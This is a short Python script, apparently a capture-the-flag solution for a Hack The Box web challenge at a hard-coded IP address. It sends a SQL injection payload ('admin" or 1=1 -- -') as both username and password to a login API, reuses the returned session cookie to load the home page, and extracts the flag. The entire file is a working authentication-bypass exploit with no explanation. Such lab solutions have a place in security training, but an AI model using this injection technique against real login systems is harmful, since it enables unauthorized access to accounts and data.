#!/usr/bin/python3
from re import findall

from requests import get, post

url = "http://165.227.224.40:30917/"

payload = {"username": "admin\" or 1=1 -- -", "password": "admin\" or 1=1 -- -"}

r = post(url + "api/login", json=payload)

cookie = r.headers["Set-Cookie"].split(';')[0]

#print(cookie)

r = get(url + "home", headers={"Cookie": cookie})

flag = findall("HTB{.*", r.text)[0].split('<')[0]

print(flag)